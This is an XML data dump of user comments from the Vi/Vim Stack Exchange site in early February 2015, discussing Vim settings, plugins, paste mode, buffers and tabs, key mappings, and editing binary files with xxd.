  <row Id="190" PostId="237" Score="0" Text="If you'd like more control (or reduce the repeated hassle) consider adding an auto-command to invoke a code-formatting tool like `astyle` when you save a buffer. See [this](http://stackoverflow.com/questions/12209971/in-vim-i-want-to-run-astyle-on-the-file-im-on-when-i-save) question on SO for the details." CreationDate="2015-02-04T04:11:01.147" UserId="224" />
  <row Id="191" PostId="241" Score="1" Text="I found [this](http://stackoverflow.com/a/4818223/761170) answer over at SO relevant, but I'd like to have this functionality without a plugin if possible." CreationDate="2015-02-04T04:15:27.193" UserId="224" />
  <row Id="192" PostId="238" Score="0" Text="This happens in standard `gnome-terminal` too, without `tmux`." CreationDate="2015-02-04T05:25:51.327" UserId="142" />
  <row Id="193" PostId="235" Score="0" Text="`'smartindent'` is deprecated, so that's not the best choice. It has been replaced by `'cindent'` and `'cinoptions'` for C-like languages.  In general, though, file type indenting is the way to go, with `'autoindent'` as a fallback." CreationDate="2015-02-04T05:25:56.180" UserId="15" />
  <row Id="194" PostId="247" Score="1" Text="Setting the t_ut option worked!" CreationDate="2015-02-04T06:04:34.760" UserId="226" />
  <row Id="195" PostId="41" Score="5" Text="note a vimrc file can also be called other things: for example vimrc (if it's in ~/.vim)." CreationDate="2015-02-04T06:09:45.483" UserId="233" />
  <row Id="196" PostId="219" Score="0" Text="This is one of the plugins I swear by.. it's like having a little scratch buffer that you can commit back to your normal code file." CreationDate="2015-02-04T06:57:38.020" UserId="248" />
  <row Id="197" PostId="242" Score="6" Text="You can nicely select the code you pasted in visual mode using \`[v\`]" CreationDate="2015-02-04T07:04:01.140" UserId="248" />
  <row Id="198" PostId="235" Score="0" Text="@jamessan `smartindent` isn't deprecated, but `cindent` is worth noting. I've updated the answer. (Thanks!)" CreationDate="2015-02-04T07:15:42.053" UserId="24" />
  <row Id="199" PostId="221" Score="0" Text="As an aside, I find this plugin very useful for editing markdown https://github.com/suan/vim-instant-markdown" CreationDate="2015-02-04T07:24:17.500" UserId="248" />
  <row Id="200" PostId="255" Score="1" Text="thanks for the suggestion, but as I did note in my question, I'd like to know if this can be done without a plugin." CreationDate="2015-02-04T07:28:39.943" UserId="224" />
  <row Id="201" PostId="190" Score="0" Text="I've tried them all and I always come back to SuperTab, it's the least intrusive." CreationDate="2015-02-04T07:31:00.583" UserId="248" />
  <row Id="202" PostId="150" Score="0" Text="Having any kind of folding enabled also has a massive effect" CreationDate="2015-02-04T07:38:57.280" UserId="248" />
  <row Id="203" PostId="257" Score="0" Text="This saves you a single keystroke when you don't need to navigate your file (i.e. in empty files) since navigation is easier in command mode. Why would you want to do this?" CreationDate="2015-02-04T07:41:19.070" UserId="211" />
  <row Id="204" PostId="257" Score="1" Text="@Earthliŋ - Because I can only access my Linux over SSH, and my computer that I can use for SSH access is _*so*_ slow, it takes _*ages*_ to load command mode. (Also my Openwrt system is quite slow)." CreationDate="2015-02-04T07:45:25.977" UserDisplayName="user254" />
  <row Id="205" PostId="257" Score="3" Text="Thanks. Why don't you add this info to the question body? This way the question makes much more sense (to me at least) and will be easier findable (e.g. by searching &quot;vim command mode slow to load&quot;)." CreationDate="2015-02-04T07:59:09.577" UserId="211" />
  <row Id="206" PostId="241" Score="5" Text="Please include requirements like that in the question itself, instead of in a comment." CreationDate="2015-02-04T08:00:57.743" UserId="205" />
  <row Id="207" PostId="182" Score="0" Text="You might be also interested in this plugin:&#xA;https://github.com/tomtom/enabler_vim/" CreationDate="2015-02-04T08:01:06.693" UserId="258" />
  <row Id="208" PostId="13" Score="1" Text="I use this kind of script on my Nokia N900: http://www.vim.org/scripts/script.php?script_id=3141" CreationDate="2015-02-04T08:03:40.020" UserId="258" />
  <row Id="209" PostId="254" Score="4" Text="This is redundant, since you could just do 500l to move 500 characters right." CreationDate="2015-02-04T08:10:02.760" UserId="263" />
  <row Id="210" PostId="258" Score="0" Text="This is hackish, but perhaps you could use `BufNewFile` to trigger the creation of an autocommand with a `BufWritePost`. After the event for `BufWritePost` finishes, delete the `BufWritePost` autocommand." CreationDate="2015-02-04T08:11:06.320" UserId="261" />
  <row Id="211" PostId="254" Score="0" Text="True. Than maybe something like ``qd500lq`` to use just ``@d`` to move 500 characters right?" CreationDate="2015-02-04T08:11:31.373" UserId="245" />
  <row Id="212" PostId="258" Score="0" Text="@void-pointer I considered doing that, then I stopped to wonder if there's a more elegant way - perhaps I had misunderstood the meaning of some event or something like that." CreationDate="2015-02-04T08:14:12.830" UserId="205" />
  <row Id="214" PostId="269" Score="0" Text="Is there a reason why you would have hard linebreaks as opposed to being on one long line (or more reasonable, one line per paragraph, as one might do in a TeX document)." CreationDate="2015-02-04T08:21:41.390" UserId="130" />
  <row Id="215" PostId="258" Score="0" Text="I'm not an expert on Vimscript, but after going through `help au`, it doesn't seem like there's a mechanism in place to fire an autocommand on the first write only." CreationDate="2015-02-04T08:23:57.480" UserId="261" />
  <row Id="216" PostId="269" Score="0" Text="@mixedmath I like to set my textwidth to 80 and use gqap after I finish writing a paragraph. I would imagine that the document would become difficult to read if I used the one sentence per paragraph approach." CreationDate="2015-02-04T08:25:11.567" UserId="261" />
  <row Id="220" PostId="235" Score="0" Text="I'd also recommend you taking a look at http://editorconfig.org/  . There's of course a plugin for vim (and many other editors) and it's a great way to keep your editor defaults on your VCS" CreationDate="2015-02-04T08:50:18.560" UserId="266" />
  <row Id="221" PostId="265" Score="1" Text="Although you've probably heard this before, vim-latex is an extremely large and convoluted plugin that's deceptively challenging to modify in reasonable ways. So the easy answer is &quot;ignore it&quot;. The longer answer is: make changes to ftplugin/outline.py,envmacros.vim,wizardfuncs.vim,texrc,dictionaries/dictionary. If you search and remove every instance of eqnarray, latex-suite will continue to work and will omit eqnarray. Adding your own wouldn't be too dissimilar to replacing each instance of eqnarray with align (or your desired environment)." CreationDate="2015-02-04T08:58:46.517" UserId="130" />
  <row Id="222" PostId="268" Score="0" Text="Take a look at ‘:h write-help`" CreationDate="2015-02-04T08:59:22.807" UserId="266" />
  <row Id="223" PostId="276" Score="0" Text="Have you installed any plugins?" CreationDate="2015-02-04T09:00:00.047" UserId="245" />
  <row Id="224" PostId="268" Score="0" Text="Sorry :h help-writing" CreationDate="2015-02-04T09:00:03.020" UserId="266" />
  <row Id="225" PostId="276" Score="0" Text="Something akin to `bash -x` to see what gets executed would be useful." CreationDate="2015-02-04T09:00:34.737" UserId="205" />
  <row Id="226" PostId="228" Score="1" Text="Isn't this answer directly disproven by [doorknob's post](http://vi.stackexchange.com/a/195/267)?" CreationDate="2015-02-04T09:00:53.897" UserId="267" />
  <row Id="227" PostId="276" Score="0" Text="@Melon: Yes I only have 1 plugin installed.&#xA;muru: Can you explain further?" CreationDate="2015-02-04T09:04:51.083" UserId="65" />
  <row Id="228" PostId="276" Score="0" Text="Oh, I don't have an answer. I was just noting that something similar to `bash -x` would be handy. `bash -x` prints out every command executed, so if you have slow loading times, you could see which commands slow it down." CreationDate="2015-02-04T09:10:05.137" UserId="205" />
  <row Id="229" PostId="268" Score="0" Text="@LeonardoConstantino Unless I'm mistaken, this would be akin to literally integrating my todo list into vim's help system. I'm not interested in typing `:h hardway` and being taken to my entry on `hardway` which is actually a helpfile. Or perhaps I'm misunderstanding your suggestion? Forgive me, I'm not entirely certain." CreationDate="2015-02-04T09:10:10.470" UserId="130" />
  <row Id="231" PostId="277" Score="0" Text="I followed your instructions. After starting profiling, I used `dw` twice and then exit. Then looking at the log I got `FUNCTION LatexBox_FoldLevel(), Called 1930 times`" CreationDate="2015-02-04T09:16:06.657" UserId="65" />
  <row Id="232" PostId="265" Score="0" Text="@mixedmath In fact I haven't heard anything about vim-latex. Are you saying it's better to &quot;write my own plugin&quot;? So far vim-latex has syntax highlighting, predefined environments, auto-completion and key bindings for compilation. How much work would it be to replicate these features from scratch? (I don't mind typing, so I could live without auto-completion.)" CreationDate="2015-02-04T09:16:55.417" UserId="211" />
  <row Id="233" PostId="276" Score="1" Text="Dangit, I answered a duplicate. While I vote to close this as a duplicate, I also respond to your comment: LatexBox shouldn't be called 2000 times after deleting 2 words. Now that you've  found the problem, you have to finagle with the plugin. I wish I knew more about LatexBox to help you." CreationDate="2015-02-04T09:20:05.760" UserId="130" />
  <row Id="234" PostId="51" Score="8" Text="This reads like a rehash of a press release rather than an actual rundown of why somebody should care. For example I've been using vim for two decades and can't remember the last time the core program showed me any kind of instability so why should I care about &quot;more stable&quot;?" CreationDate="2015-02-04T09:23:25.310" UserId="267" />
  <row Id="235" PostId="276" Score="0" Text="@Carpetsmoker Yes, [this answer](http://vi.stackexchange.com/a/191/205) is very close to what I had in mind for this question." CreationDate="2015-02-04T09:23:43.727" UserId="205" />
  <row Id="236" PostId="265" Score="0" Text="Are you asking about how to neuter the Vim-LaTeX plugin so that it no longer supports `eqnarray`? Or are you asking about how to expunge `eqnarray` from all your existing documents the next time you open them? Or something else?" CreationDate="2015-02-04T09:33:36.433" UserId="24" />
  <row Id="237" PostId="284" Score="1" Text="Trying this, I get `E121: Undefined variable: mapleader`." CreationDate="2015-02-04T09:37:15.120" UserId="268" />
  <row Id="238" PostId="284" Score="0" Text="Then for some reason the mapleader was not set or has been unset" CreationDate="2015-02-04T09:38:49.390" UserId="248" />
  <row Id="239" PostId="265" Score="0" Text="No, I wouldn't recommend writing your own plugin. I'm not quite sure what you're quoting from there, either. There are a variety of latex plugins. latex-suite is known to integrate poorly with other plugins and is a pain to modify. It redefines a bunch of syntax regions that override the regions used by other plugins. It also has more functionality than anyone uses, and cannot be toggled off. For what it's worth, the README on [lervag/vim-latex](https://github.com/lervag/vim-latex) (which is not latex-suite/the vim-latex you're mentioning) links to the 4 most common latex plugins." CreationDate="2015-02-04T09:40:15.813" UserId="130" />
  <row Id="240" PostId="265" Score="0" Text="@200_success The former (I've updated the question)." CreationDate="2015-02-04T09:42:24.663" UserId="211" />
  <row Id="241" PostId="265" Score="0" Text="Either a global search-and-replace in the plugin's source code takes care of it, or the question is too broad. Either way, I don't see this as a good question for the site." CreationDate="2015-02-04T09:45:08.267" UserId="24" />
  <row Id="242" PostId="284" Score="1" Text="Oh, got it. Just a note for others then, if you don't *explicitly* set the leader key then you get the error above." CreationDate="2015-02-04T09:45:34.307" UserId="268" />
  <row Id="243" PostId="280" Score="0" Text="I suppose for my case it would be: `[ -f &quot;$f&quot; ] || {touch &quot;$f&quot; &amp;&amp; chmod +x &quot;$f&quot;}` *before* `vim`. But yes, combined with `vim -p` this would be very useful for me." CreationDate="2015-02-04T09:52:37.640" UserId="205" />
  <row Id="244" PostId="282" Score="0" Text="Why do we need a backslash in `&quot;\&lt;Space&gt;&quot;`?" CreationDate="2015-02-04T09:52:39.177" UserId="53" />
  <row Id="245" PostId="280" Score="0" Text="@muru Normally, when you do `vim newfile`, it doesn't make the file *until* you write it for the first time. So this works better the same as the default vim behaviour... And because you run this command explicitly (and not on every `:w`), running the `chmod` on existing files *as well* can be considered a feature, and not a bug :-)" CreationDate="2015-02-04T09:54:59.500" UserId="51" />
  <row Id="246" PostId="280" Score="0" Text="This does suffer from the same flaw is Dhruva's original answer - I don't want the action run on an existing file or repeatedly over the same file. In my case, solidly a bug." CreationDate="2015-02-04T09:56:44.083" UserId="205" />
  <row Id="248" PostId="280" Score="0" Text="@muru But you *only* run this when you create the file (once). Then when you edit it the next time, you just use `vim` and none of this gets run (that's how I use it, anyway)." CreationDate="2015-02-04T10:02:26.100" UserId="51" />
  <row Id="249" PostId="51" Score="1" Text="Like I said in the last paragraph, it's not about stability but more about the kind of community it's built around. Nobody dare question vim's stability, I surely would not, have been using it for 8 long years and since last 2 years have been using the head version!" CreationDate="2015-02-04T10:03:03.160" UserId="74" />
  <row Id="250" PostId="280" Score="0" Text="Remembering that sort of stuff (use x for this and y for that) is what I have vim and zsh for. :P" CreationDate="2015-02-04T10:03:58.453" UserId="205" />
  <row Id="251" PostId="280" Score="0" Text="@muru Well, the point is your script never know which files you want executable anyway. Not all .py files are supposed to be executable... So a &quot;human decision&quot; is needed at some point." CreationDate="2015-02-04T10:05:38.530" UserId="51" />
  <row Id="253" PostId="286" Score="0" Text="`gvim` and `vim` are the same program. Just the UI is different." CreationDate="2015-02-04T10:16:01.577" UserId="51" />
  <row Id="254" PostId="286" Score="0" Text="@Carpetsmoker Yes you are right, I'll update the question." CreationDate="2015-02-04T10:20:11.443" UserId="147" />
  <row Id="257" PostId="265" Score="3" Text="@200_success I don't see how it is bad, it satisfies all requirements IMHO: It's on-topic (vim plugin), well stated now (make latex-suite forget what `eqnarray` is), applicable to general situation (if someone else wants the same thing, they should be able to use the solution to this specific one)." CreationDate="2015-02-04T10:43:22.493" UserId="82" />
  <row Id="258" PostId="41" Score="0" Text="@SaiManojKumarYadlapati Yes, AS said this has to be the same vom session. Bufwritepost is triggered when vom does the write" CreationDate="2015-02-04T11:01:10.673" UserId="59" />
  <row Id="260" PostId="292" Score="0" Text="Can it manage multiple session files?" CreationDate="2015-02-04T11:32:13.777" UserId="162" />
  <row Id="261" PostId="292" Score="1" Text="@Nebril It can. When you save the session, use the format `:Obsess &lt;session-name&gt;`. Use the particular session name you want when reloading." CreationDate="2015-02-04T11:35:05.570" UserId="53" />
  <row Id="262" PostId="291" Score="0" Text="I think this is accurate as far as it goes bot it needs to go farther to be really useful. There are at least two things that need to noted: self contained and self extracting (vimroll?) plugins and plugin managers that handle plugin dependencies and require a meta data format." CreationDate="2015-02-04T11:37:55.933" UserId="267" />
  <row Id="264" PostId="292" Score="0" Text="Thanks, I will give it a try then." CreationDate="2015-02-04T12:59:25.733" UserId="162" />
  <row Id="265" PostId="176" Score="0" Text="@Kit, the XY problem is when you failed at doing Y in order to achieve X but ask about Y instead of asking about X. Please, see my edit." CreationDate="2015-02-04T13:19:12.510" UserId="54" />
  <row Id="266" PostId="242" Score="1" Text="@Badger Just to clarify, is that backtick-bracket-v-backtick-bracket?" CreationDate="2015-02-04T13:31:18.183" UserId="286" />
  <row Id="267" PostId="299" Score="1" Text="Hmm, this does disable syntax highlighting, but in _all_ buffers, not just the one with the big file. Furthermore `&amp;ft` seems not to be set in this context thus I don't know how to restrict it to xml files only. Any ideas?" CreationDate="2015-02-04T13:54:05.970" UserId="117" />
  <row Id="268" PostId="300" Score="1" Text="You can map any key combination anywhere, and you can't do quite anything else. Is that what you mean?" CreationDate="2015-02-04T13:56:22.307" UserId="82" />
  <row Id="269" PostId="301" Score="0" Text="I use this, it's not often that I need to type two j's together, when I do I just need to give it a second or so between clicks." CreationDate="2015-02-04T13:58:49.263" UserId="11" />
  <row Id="270" PostId="301" Score="1" Text="In dvorak, `j` is the `c` key. So this wouldn't be too bad (to type `cc`). I could also bind `hh` (qwerty `j` key = dvorak `h`), which would only boot me if i was typing `shhhhhhh` or something." CreationDate="2015-02-04T13:59:13.087" UserId="134" />
  <row Id="271" PostId="294" Score="0" Text="As usual: `:help :o`." CreationDate="2015-02-04T14:19:40.907" UserId="54" />
  <row Id="273" PostId="303" Score="0" Text="Again, these are not improvements, as Ctrl is just as far from the home row as Escape is." CreationDate="2015-02-04T14:25:49.367" UserId="134" />
  <row Id="274" PostId="282" Score="7" Text="The backslash is required because otherwise vim will recognize &quot;&lt;Space&gt;&quot; as a normal string and not the code for the space key. See `:help expr-string` for examples." CreationDate="2015-02-04T14:38:40.917" UserId="20" />
  <row Id="275" PostId="242" Score="1" Text="yup.. the textarea freaked out about the backticks, so I couldn't put it in a code block :P" CreationDate="2015-02-04T14:41:03.107" UserId="248" />
  <row Id="276" PostId="68" Score="0" Text="could you combine the previous error '[s' in a remap? I would add as an answer but don't know how to do the remap so I'll leave that for someone else." CreationDate="2015-02-04T14:42:07.957" UserId="11" />
  <row Id="277" PostId="301" Score="5" Text="cc is a much more common two letter key combination, in English at least. So that may not be the best choice" CreationDate="2015-02-04T14:44:50.500" UserId="11" />
  <row Id="278" PostId="305" Score="0" Text="Related: http://stackoverflow.com/questions/1205286/renaming-the-current-file-in-vim" CreationDate="2015-02-04T14:45:06.930" UserId="205" />
  <row Id="281" PostId="309" Score="30" Text="But I'm writing a book about playing Edsgar Dijkstra playing blackjack in Reykjavik! ;)" CreationDate="2015-02-04T15:05:06.893" UserId="134" />
  <row Id="282" PostId="308" Score="0" Text="See also: http://stackoverflow.com/q/15191291 (no answers for your question though, unfortunately)" CreationDate="2015-02-04T15:06:10.630" UserId="88" />
  <row Id="283" PostId="149" Score="0" Text="Most likely I will get banned from the site forever but I have to say it: when it comes to work with huge files Emacs is the tool for the job. :-)" CreationDate="2015-02-04T15:09:48.963" UserId="13" />
  <row Id="284" PostId="303" Score="4" Text="@durron597 On a QWERTY keyboard, Ctrl may be just as far from home row, but it does have an important difference: it's *below* the home row. You only have to move your finger to press it, whereas with Esc you have to rotate your whole hand somewhat. Also, the `&lt;C-[&gt;` has a nice symmetry to it (both little fingers moving in opposite directions)." CreationDate="2015-02-04T15:10:52.970" UserId="142" />
  <row Id="286" PostId="303" Score="4" Text="Note that `&lt;C-c&gt;` [is not exactly the same as `&lt;Esc&gt;`](http://stackoverflow.com/a/5036294/732016)." CreationDate="2015-02-04T15:11:42.957" UserId="142" />
  <row Id="288" PostId="310" Score="0" Text="[What do we do with questions that are already answered somewhere else on SE](http://meta.vi.stackexchange.com/questions/45/what-do-we-do-with-questions-that-are-already-answered-somewhere-else-on-se)" CreationDate="2015-02-04T15:15:31.107" UserId="153" />
  <row Id="289" PostId="310" Score="0" Text="@OrangeTux I posted in the spirit of Gilles' answer. But with the downvote I wonder what would Gilles say to a post linking to an existing post?" CreationDate="2015-02-04T15:20:46.707" UserId="205" />
  <row Id="290" PostId="116" Score="0" Text="This isn't strictly a &quot;mode&quot; in the Vim sense of the term, so I've edited out the [modes] tag." CreationDate="2015-02-04T15:21:57.883" UserId="88" />
  <row Id="291" PostId="299" Score="0" Text="I think you want `set syntax=OFF` instead. (Or should that be setlocal?)" CreationDate="2015-02-04T15:22:02.983" UserId="31" />
  <row Id="292" PostId="116" Score="2" Text="@200_success `:help recording` isn't obvious, but `:help q` is and leads to the same place." CreationDate="2015-02-04T15:23:27.033" UserId="8" />
  <row Id="293" PostId="310" Score="0" Text="@Carpetsmoker I didn't see your comment update. An empty tabpage is not a big problem when your sessions tend to end with `:qa` by force of habit. If that's the only advantage I'd go with the other one, since it does seem simpler." CreationDate="2015-02-04T15:24:05.737" UserId="205" />
  <row Id="294" PostId="299" Score="0" Text="you might want to try `syntax clear` then maybe ?" CreationDate="2015-02-04T15:24:33.400" UserId="74" />
  <row Id="295" PostId="310" Score="3" Text="@muru WWGS? Do you have a reason to think the answers on [so] aren't satisfactory? If so, explain that in your question. In any case, summarize the SO answers in your question. If that leads to the question containing its own answer, don't post." CreationDate="2015-02-04T15:29:04.097" UserId="8" />
  <row Id="296" PostId="310" Score="0" Text="@Gilles Updated. I didn't post the actual commands, do you think I should?" CreationDate="2015-02-04T15:34:26.897" UserId="205" />
  <row Id="297" PostId="308" Score="1" Text="@Doorknob, no answers, but it does raise a good point: Regex doesn't start searching from the middle of a string. I might have to involve some VimScript to get the job done. I'm exploring the idea of reversing the (long) match, and searching it for the reversed pattern." CreationDate="2015-02-04T15:38:05.743" UserId="64" />
  <row Id="298" PostId="153" Score="1" Text="And you could map `:set syntax=prolog` to something (maybe `&lt;Leader&gt;-p`)." CreationDate="2015-02-04T15:38:19.340" UserId="141" />
  <row Id="299" PostId="310" Score="0" Text="@muru Since none of the commands meet all of your requirements, it isn't necessary to post them. It might be useful, however, to stave off answers that say “just do X” only for you to have to reply “no, that doesn't meet requirement #3”." CreationDate="2015-02-04T15:44:20.607" UserId="8" />
  <row Id="300" PostId="82" Score="0" Text="@Byron Arch linux with tiling WMs. I have latest gcc and clang installed and completed install with same steps you told." CreationDate="2015-02-04T15:44:53.947" UserId="101" />
  <row Id="302" PostId="321" Score="0" Text="Another really useful tool to use with this is the `sort` command." CreationDate="2015-02-04T16:24:31.473" UserId="306" />
  <row Id="303" PostId="321" Score="4" Text="@CodyPoll What's wrong with Vim's `:sort`?" CreationDate="2015-02-04T16:25:29.470" UserId="51" />
  <row Id="305" PostId="321" Score="2" Text="Well I'll be - never knew about that command." CreationDate="2015-02-04T16:27:32.807" UserId="306" />
  <row Id="307" PostId="321" Score="5" Text="@Carpetsmoker The external sort command has a lot more options and (depending on locale, etc.) produces a different order." CreationDate="2015-02-04T16:34:21.707" UserId="31" />
  <row Id="309" PostId="324" Score="0" Text="I've edited your question, as you can refer to different concepts when you say &quot;buffer&quot;, depending on context... Your original question was somewhat unclear IMHO ... I hope you agree with this, but feel free to change it back if you don't." CreationDate="2015-02-04T16:48:36.363" UserId="51" />
  <row Id="310" PostId="324" Score="0" Text="The term &quot;paste buffer&quot; is often used (not just within the context of vim) to mean the clipboard or something similar. It's not necessarily the same use of &quot;buffer&quot; in the vim sense." CreationDate="2015-02-04T16:48:51.293" UserId="72" />
  <row Id="312" PostId="324" Score="0" Text="@Carpetsmoker thanks for the edit. Perhaps the multiple uses (and perhaps misuses) of the term buffer leads to my confusion." CreationDate="2015-02-04T16:55:19.057" UserId="69" />
  <row Id="313" PostId="324" Score="0" Text="@Carpetsmoker Actually, the term buffer is quite clearly defined in Vim.  That people are misusing the term doesn't mean that there are actually multiple ways that it can be understood with respect to Vim." CreationDate="2015-02-04T16:56:15.090" UserId="15" />
  <row Id="315" PostId="261" Score="0" Text="Does this only work with Vim, or does it work also on Vi (My Openwrt system only has Vi)." CreationDate="2015-02-04T16:58:25.860" UserDisplayName="user254" />
  <row Id="316" PostId="310" Score="0" Text="Why do you need to use a tab page for every buffer?  There are many ways to navigate through the open buffers in a single tab page.  Vim's tab pages are intended to be used more like viewports than as a representation of a file.  The latter is already implemented by Vim's buffers." CreationDate="2015-02-04T17:02:48.887" UserId="15" />
  <row Id="317" PostId="307" Score="0" Text="Thanks for the edit/fix :) @carpetsmoker" CreationDate="2015-02-04T17:06:45.127" UserId="248" />
  <row Id="318" PostId="310" Score="0" Text="@jamessan Why not? What do I gain from using buffers instead? With tabs, I can see a quick visual indication of which file I'm editing. I'm pretty sure that can be done with buffers. I have read [this famous post](http://stackoverflow.com/questions/102384/using-vims-tabs-like-buffers/103590#103590), but if I were to make an analogy: I don't see why I should use Firefox's tab groups instead of having windows open in different workspaces. I have never really gotten used to navigating buffers, but if the reasoning is strong enough, I don't mind switching." CreationDate="2015-02-04T17:14:05.140" UserId="205" />
  <row Id="321" PostId="310" Score="0" Text="Everything in Vim is built around buffers.  Windows exist to view buffers.  Tab pages exist to organize windows.  Buffers can be displayed in any number of windows (and therefore tab pages).  Ignoring the fact that the buffer is the core object is just limiting your potential experience with Vim.  Using tab pages just for the visual cue of the buffer doesn't scale, because eventually the tab page title becomes too small.  Maybe I should make an answer to go further." CreationDate="2015-02-04T17:27:29.023" UserId="15" />
  <row Id="322" PostId="331" Score="2" Text="None of this answers my question. I put in explicit requirements for a reason! Usually `'paste'` is indeed not active beforehand, but I don't want to have to think about this. I often work in a Vim that doesn't have access to the X clipboard or mouse, either because my Vim build doesn't have the `xterm_clipboard` feature, or because I'm working in e.g. a Screen session which happens to be currently attached to an X terminal." CreationDate="2015-02-04T17:30:10.250" UserId="8" />
  <row Id="323" PostId="141" Score="0" Text="It does not work for me. It inserts a comment only in the first line." CreationDate="2015-02-04T17:38:30.100" UserId="83" />
  <row Id="324" PostId="141" Score="0" Text="Are you pushing `ctrl`? Because `ctrl+v` is a different thing from just `v`." CreationDate="2015-02-04T17:40:44.677" UserId="306" />
  <row Id="325" PostId="213" Score="0" Text="Wow, that's an amazing use of search, thanks @superjer! And my mind is blown for the day by learning about vim's advanced registers." CreationDate="2015-02-04T17:46:35.337" UserId="67" />
  <row Id="326" PostId="213" Score="0" Text="One disadvantage of this approach is that if you have search highlighting on, you'll find that all the characters in the cursor's vertical column are now highlighted after &quot;column up&quot;ing or &quot;column down&quot;ing." CreationDate="2015-02-04T17:47:57.543" UserId="67" />
  <row Id="328" PostId="156" Score="1" Text="This seems to work perfectly (and quickly), and is easily modified into a `FloatDown` function as well. Into my .vimrc it goes, thanks! https://github.com/alxndr/dotfiles/commit/0e25a302" CreationDate="2015-02-04T17:54:43.520" UserId="67" />
  <row Id="329" PostId="331" Score="0" Text="@Gilles Then could you explain how you're pasting?  That's relevant information to be able to provide an answer that can wrap that action with what you want to do." CreationDate="2015-02-04T17:55:52.117" UserId="15" />
  <row Id="336" PostId="161" Score="1" Text="Option 4: Plugin" CreationDate="2015-02-04T18:25:31.070" UserId="306" />
  <row Id="340" PostId="335" Score="0" Text="This seems to be on the right track, but it isn't working. A plain `p` (without a preceding `&quot;` and register name) doesn't do anything other than make `&quot;p` appears in the status line. `&quot;ap` is equivalent to `a`, `&quot;bp` beeps, … I don't get the logic. `&quot;+` beeps immediately, I don't even get to say that I mean `+` or `*` as a register name." CreationDate="2015-02-04T18:33:22.507" UserId="8" />
  <row Id="341" PostId="335" Score="0" Text="Assuming these fundamental problems are solved, is there an exhaustive list of commands I'd need to override? The set looks daunting, especially if I want to support yanking as well." CreationDate="2015-02-04T18:34:17.103" UserId="8" />
  <row Id="342" PostId="331" Score="1" Text="My basic use case is to paste with the middle mouse button or with Shift+Insert. That's not really relevant though: the core of the question is how to set an option, switch to insert mode (with `i`, I'm not asking how to parametrize this), and restore the value of the option upon return from insert mode." CreationDate="2015-02-04T18:35:40.233" UserId="8" />
  <row Id="343" PostId="335" Score="0" Text="@Gilles Updated to fix the behavior with non-+/* registers.  The problem with `&quot;+` when your vim has `-xterm_clipboard` is more difficult because it never gets to this function.  Specifying an invalid register (`+`) aborts the command.  SO, it looks like the behavior actually has to be inverted so map the `&quot;+` or `&quot;*` and then handle the command specified by the user..." CreationDate="2015-02-04T18:49:24.360" UserId="15" />
  <row Id="344" PostId="340" Score="0" Text="Sidenote: if you're pressing the same movement key more than a few times in a row, you're probably doing it wrong (use `wWeE$)}` etc.), and if you're using arrow keys you're *definitely* using Vim wrong." CreationDate="2015-02-04T18:53:18.103" UserId="88" />
  <row Id="346" PostId="345" Score="0" Text="That was freakishly fast!" CreationDate="2015-02-04T18:59:00.940" UserId="135" />
  <row Id="347" PostId="345" Score="9" Text="@janos :-) I cheated. I wrote this last week, because I thought it would make a&#xA;good weblog post ... I haven't completely finished it yet, but it's finished enough to be a good fit for this question." CreationDate="2015-02-04T19:04:03.030" UserId="51" />
  <row Id="350" PostId="331" Score="1" Text="@Gilles The core of your question as stated in this comment is much clearer to me than your original question.  Thanks." CreationDate="2015-02-04T19:48:12.927" UserId="15" />
  <row Id="351" PostId="328" Score="1" Text="I like your question (I've been there many times myself). However, isn't it easier to paste from the `+` or `*` register?" CreationDate="2015-02-04T19:49:17.070" UserId="82" />
  <row Id="352" PostId="331" Score="1" Text="@Gilles It is not relevant to _you_, but it can be relevant to future visitors. Therefore either you can put it in the question itself (&quot;I know I can use `&quot;*p` or `&quot;+p` to paste from the clipboards, but I wan't to use the system's paste abilities&quot;) and then this answer is unnecessary. Or you don't, and then I think this answer has its place here." CreationDate="2015-02-04T19:51:45.347" UserId="82" />
  <row Id="353" PostId="349" Score="1" Text="Fully agree. Having the ctrl key on the home row improves a lot of usability (scrolling through completions with ctrl+n, scrolling through the file with ctrl+f/ctrl+b, escaping with ctrl+] etc. All of these key combos are easier to perform this way." CreationDate="2015-02-04T20:09:59.057" UserId="227" />
  <row Id="354" PostId="351" Score="0" Text="Wow. For me it's even worse. If I do `gg=G` in a `.js` file like this (`ft=javascript` properly), the indent on `.chainCall2()` *only* is removed." CreationDate="2015-02-04T20:12:21.150" UserId="135" />
  <row Id="355" PostId="350" Score="0" Text="I believe the OP is using OSX, so neither Win32 nor X11 (most likely)." CreationDate="2015-02-04T20:18:05.117" UserId="5" />
  <row Id="356" PostId="350" Score="1" Text="Is there an answer for OSX?" CreationDate="2015-02-04T20:19:17.520" UserId="141" />
  <row Id="357" PostId="350" Score="0" Text="Alas, the vim documentation doesn't mention OSX and I don't have an OSX machine handy on which to try it. :-(" CreationDate="2015-02-04T20:22:20.240" UserId="227" />
  <row Id="358" PostId="212" Score="0" Text="Thanks, that's the one I was after" CreationDate="2015-02-04T20:32:26.247" UserId="182" />
  <row Id="359" PostId="331" Score="0" Text="@yo' Ok, I've edited my question. Pasting from the clipboard was just a motivating example — the core of the question is how to save and restore an option around an insertion command." CreationDate="2015-02-04T21:01:21.397" UserId="8" />
  <row Id="360" PostId="328" Score="0" Text="@yo' [Only when they work](http://vi.stackexchange.com/questions/332/define-custom-commands-for-the-and-registers). Which, for my uses of Vim, is often not the case." CreationDate="2015-02-04T21:02:04.100" UserId="8" />
  <row Id="361" PostId="347" Score="1" Text="If I use multiple windows, does that mean they have to be on-screen all the time? What happens if I close a window while another window shows the same buffer, is the cursor position in that window lost? Is there anything like `:ownsyntax` for other settings, such as indentation, compiler command, etc.?" CreationDate="2015-02-04T21:12:43.510" UserId="8" />
  <row Id="362" PostId="348" Score="0" Text="This seems on the right track (in particular, I had no idea how to “bracket” a stretch of insertion by normal world commands). Thanks. However, it isn't quite right and I don't see where the problem is: after `_i`, the `paste` option is off, even if it was on before." CreationDate="2015-02-04T21:16:10.750" UserId="8" />
  <row Id="363" PostId="344" Score="0" Text="If I follow these instructions (open binary file, `:%!xxd`, `:%!xxd -r`, `:w`, didnt make any changes!) then the binary file written is **not** the same as the original ... Is this the case for you (I tested with `/bin/ls`). I need to use `:set binary` before saving (also see my answer which explains why) ... Maybe it's something in my vimrc? But regardless, I would always use `set binary` for safety ..." CreationDate="2015-02-04T21:31:29.120" UserId="51" />
  <row Id="364" PostId="344" Score="0" Text="I didn't notice in my earlier tests, I even changed strings in the binary file, and it worked. Now on closer look I see that Vim adds an end of line character, unless I switch on binary mode. So you're right, I updated my post, thanks for pointing this out!" CreationDate="2015-02-04T21:39:53.230" UserId="135" />
